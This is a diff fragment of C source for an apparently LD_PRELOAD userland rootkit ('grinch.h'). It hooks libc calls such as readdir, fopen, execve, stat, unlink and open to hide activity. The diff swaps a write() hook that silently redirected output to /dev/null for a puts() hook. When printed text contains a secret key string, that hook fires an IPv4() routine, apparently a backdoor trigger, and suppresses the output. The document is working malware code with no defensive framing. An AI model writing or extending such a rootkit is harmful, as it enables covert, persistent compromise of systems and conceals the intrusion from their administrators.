@@ -15,24 +15,24 @@
 #include "grinch.h"
 
 
-static struct dirent* (*old_readdir)(DIR *dir) = NULL;
-static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
-static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
-static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
-static int (*old_execve)(const char *path, char *const argv[], char *const envp[]) = NULL;
-static int (*old_access)(const char *path, int mode) = NULL;
-static int (*old_open)(const char *path, int flags, mode_t mode) = NULL;
-static int (*old_openat)(int fd, const char *pathname, int flags, mode_t mode) = NULL;
-static int (*old_rmdir)(const char *path) = NULL;
-static int (*old_unlink)(const char *path) = NULL;
-static int (*old_unlinkat)(int fd, const char *path, int flags) = NULL;
-static int (*old_fxstat)(int ver, int fd, struct stat *buf) = NULL;
-static int (*old_fxstat64)(int ver, int fd, struct stat64 *buf) = NULL;
-static int (*old_lxstat)(int ver, const char *path, struct stat *buf) = NULL;
-static int (*old_lxstat64)(int ver, const char *path, struct stat64 *buf) = NULL;
-static int (*old_xstat)(int ver, const char *path, struct stat *buf) = NULL;
-static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf) = NULL;
-static ssize_t (*old_write)(int fd, const void *buf, size_t count) = NULL;
+static struct dirent* (*old_readdir)(DIR *) = NULL;
+static struct dirent64* (*old_readdir64)(DIR *) = NULL;
+static FILE* (*old_fopen)(const char *, const char *) = NULL;
+static FILE* (*old_fopen64)(const char *, const char *) = NULL;
+static int (*old_execve)(const char *, char *const [], char *const []) = NULL;
+static int (*old_access)(const char *, int) = NULL;
+static int (*old_open)(const char *, int, mode_t) = NULL;
+static int (*old_openat)(int, const char *, int, mode_t) = NULL;
+static int (*old_rmdir)(const char *) = NULL;
+static int (*old_unlink)(const char *) = NULL;
+static int (*old_unlinkat)(int, const char *, int) = NULL;
+static int (*old_fxstat)(int, int, struct stat *) = NULL;
+static int (*old_fxstat64)(int, int, struct stat64 *) = NULL;
+static int (*old_lxstat)(int, const char *, struct stat *) = NULL;
+static int (*old_lxstat64)(int, const char *, struct stat64 *) = NULL;
+static int (*old_xstat)(int, const char *, struct stat *) = NULL;
+static int (*old_xstat64)(int, const char *, struct stat64 *) = NULL;
+static int (*old_puts)(const char *);
 
 
 void IPv4() {
@@ -521,17 +521,12 @@ int stat64(const char *path, struct stat64 *buf) {
 }
 
 
-/*
- * 0x401 is: O_WRONLY | O_APPEND
- * 0666 is: rw-rw-rw-
- */
-ssize_t write(int fd, const void *buf, size_t count) {
-    if(old_write == NULL) old_write = dlsym(RTLD_NEXT, "write");
-    if(old_open == NULL) old_open = dlsym(RTLD_NEXT, "open");
+int puts(const char *s) {
+    if(old_puts == NULL) old_puts = dlsym(RTLD_NEXT, "puts");
 
-    if(strstr(buf, KEY_STRING) != NULL) {
-        fd = old_open("/dev/null", 0x401, 0666);
+    if(strstr(s, KEY_STRING) != NULL) {
         IPv4();
+        return old_puts((const char *)"");
     }
-    return old_write(fd, buf, count);
+    return old_puts(s);
 }
